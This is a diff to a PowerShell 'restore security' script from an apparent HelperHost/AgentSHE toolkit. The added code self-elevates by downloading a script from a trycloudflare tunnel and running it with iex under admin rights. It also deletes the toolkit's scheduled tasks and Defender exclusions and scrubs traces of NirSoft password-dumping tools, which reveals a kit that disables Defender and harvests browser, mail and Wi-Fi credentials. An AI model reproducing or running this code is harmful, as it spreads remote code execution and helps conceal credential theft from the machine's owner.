@@ -3,14 +3,100 @@
 # UAC is restored LAST so mid-wipe elevated steps don't re-prompt.
 $ErrorActionPreference = 'SilentlyContinue'
 try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
+
+function Test-IsAdmin {
+  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+  $p = New-Object Security.Principal.WindowsPrincipal($id)
+  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+# Self-elevate if needed (manual restore from PowerShell)
+if (-not (Test-IsAdmin) -and $env:AGENTSHE_ELEVATED -ne '1') {
+  $self = $MyInvocation.MyCommand.Path
+  if (-not $self) {
+    # iex'd from memory: re-download elevated
+    $url = $env:AGENTSHE_RESTORE_URL
+    if (-not $url) { $url = 'https://mayor-western-issn-sticker.trycloudflare.com/files/scripts/restore-win-security.ps1' }
+    $wrap = Join-Path $env:TEMP ('hh-restore-manual-' + [guid]::NewGuid().ToString('n') + '.ps1')
+    @(
+      "`$ErrorActionPreference='SilentlyContinue'"
+      "`$env:AGENTSHE_ELEVATED='1'"
+      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12"
+      "iex ((curl.exe -fsSL '$url' | Out-String))"
+    ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$wrap`""
+    $psi.Verb = 'runas'
+    $psi.UseShellExecute = $true
+    try {
+      $p = [Diagnostics.Process]::Start($psi)
+      $p.WaitForExit()
+      Write-Output 'security-restored (elevated)'
+    } catch {
+      throw 'UAC refusee — relance en tant qu''Administrateur'
+    }
+    exit 0
+  }
+}
+
 $hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $cache = Join-Path $env:TEMP 'HelperHostCache'
 $tools = Join-Path $hh 'tools'
 
-$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av'
+$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|ChromeCookiesView|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av|dControl'
 
 # Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
 foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot')) {
+  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
+  schtasks /Delete /TN $tn /F 2>$null | Out-Null
+}
+
+# Re-enable Defender via Sordum dControl BEFORE removing our GPO (mirror of /D at session start)
+# SYSTEM task = silencieux (pas d'UI dControl)
+$dc = Join-Path $hh 'dControl.exe'
+$dcTemp = Join-Path $env:TEMP 'hh-dcontrol.exe'
+if (Test-Path $dc) {
+  Copy-Item $dc $dcTemp -Force -EA SilentlyContinue
+}
+$dcRun = if (Test-Path $dcTemp) { $dcTemp } elseif (Test-Path $dc) { $dc } else { $null }
+if ($dcRun) {
+  $wrap = Join-Path $env:TEMP 'hh-dc-on.cmd'
+  @(
+    '@echo off'
+    "start \"\" /wait \"$dcRun\" /E"
+    'ping 127.0.0.1 -n 4 >nul'
+    'taskkill /F /IM dControl.exe >nul 2>&1'
+    'exit /b 0'
+  ) -join "`r`n" | Set-Content -Encoding ASCII $wrap -Force
+  $tn = 'HelperHostDControlOn'
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
+  try { schtasks /Delete /TN $tn /F 2>$null | Out-Null } catch {}
+  try {
+    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$wrap`""
+    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
+    $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+    Register-ScheduledTask -TaskName $tn -Action $action -Settings $set -Principal $prin -Force | Out-Null
+    Start-ScheduledTask -TaskName $tn -EA SilentlyContinue
+  } catch {
+    schtasks /Create /TN $tn /TR "cmd.exe /c `"$wrap`"" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null
+    schtasks /Run /TN $tn 2>$null | Out-Null
+  }
+  for ($i = 0; $i -lt 40; $i++) {
+    Start-Sleep -Seconds 1
+    $st = (Get-ScheduledTask -TaskName $tn -EA SilentlyContinue).State
+    if ($st -and $st -ne 'Running') { break }
+  }
+  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue } catch {}
+  schtasks /Delete /TN $tn /F 2>$null | Out-Null
+  Get-Process dControl -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
+  Remove-Item $wrap, $dcTemp -Force -EA SilentlyContinue
+}
+Remove-Item (Join-Path $hh '.dcontrol-off') -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'dc-off.cmd') -Force -EA SilentlyContinue
+Remove-Item (Join-Path $hh 'dControl.exe') -Force -EA SilentlyContinue
+# Also kill EarlyAV / DControl helper tasks
+foreach ($tn in @('HelperHostDControlOff', 'HelperHostDControlOn', 'HelperHostEarlyAV')) {
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
   schtasks /Delete /TN $tn /F 2>$null | Out-Null
 }
@@ -65,7 +151,7 @@ foreach ($regPath in @(
   'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center',
   'HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter'
 )) {
-  cmd.exe /c "reg delete `"$regPath`" /f" | Out-Null
+  cmd.exe /c "reg delete `"$regPath`" /f >nul 2>&1" | Out-Null
 }
 foreach ($polRoot in @(
   'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender',
@@ -76,7 +162,7 @@ foreach ($polRoot in @(
     Remove-Item $polRoot -Recurse -Force -EA SilentlyContinue
   }
 }
-cmd.exe /c 'reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f' | Out-Null
+cmd.exe /c 'reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f >nul 2>&1' | Out-Null
 Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Force -EA SilentlyContinue
 # Undo live (non-policy) RTP overrides we may have written
 $rtpLive = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'
@@ -86,18 +172,18 @@ if (Test-Path $rtpLive) {
     'DisableScanOnRealtimeEnable','DisableIOAVProtection','DisableScriptScanning'
   )) {
     Remove-ItemProperty $rtpLive -Name $n -Force -EA SilentlyContinue
-    cmd.exe /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`" /v $n /f" | Out-Null
+    cmd.exe /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection`" /v $n /f >nul 2>&1" | Out-Null
   }
 }
 # Tamper / Features leftovers
 Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtectionSource -Force -EA SilentlyContinue
-cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /f' | Out-Null
-cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /f' | Out-Null
+cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /f >nul 2>&1' | Out-Null
+cmd.exe /c 'reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtectionSource /f >nul 2>&1' | Out-Null
 
 # Refresh policy cache so UI drops "gere par votre administrateur"
-cmd.exe /c 'gpupdate.exe /Target:Computer /Force' | Out-Null
-cmd.exe /c 'gpupdate.exe /force' | Out-Null
+cmd.exe /c 'gpupdate.exe /Target:Computer /Force >nul 2>&1' | Out-Null
+cmd.exe /c 'gpupdate.exe /force >nul 2>&1' | Out-Null
 
 # --- Defender services ---
 foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'webthreatdefsvc', 'webthreatdefusersvc')) {
@@ -106,9 +192,9 @@ foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'w
     $start = if ($svc -in @('WdNisDrv', 'WdFilter', 'WdBoot')) { 1 } else { 2 }
     Set-ItemProperty $svcKey -Name Start -Value $start -Type DWord -Force -EA SilentlyContinue
   }
-  cmd.exe /c "sc.exe config $svc start= demand" | Out-Null
+  cmd.exe /c "sc.exe config $svc start= demand >nul 2>&1" | Out-Null
   if ($svc -in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc')) {
-    cmd.exe /c "sc.exe config $svc start= auto" | Out-Null
+    cmd.exe /c "sc.exe config $svc start= auto >nul 2>&1" | Out-Null
     Set-Service $svc -StartupType Automatic -EA SilentlyContinue
     Start-Service $svc -EA SilentlyContinue
   }
@@ -136,6 +222,7 @@ if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
   Remove-MpPreference -ExclusionPath $tools -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'HelperHost.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionProcess 'EdgeRelay.exe' -EA SilentlyContinue
+  Remove-MpPreference -ExclusionProcess 'dControl.exe' -EA SilentlyContinue
   Remove-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
   if (Test-Path (Join-Path $hh 'HelperHost.exe')) {
     Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'HelperHost.exe') -EA SilentlyContinue
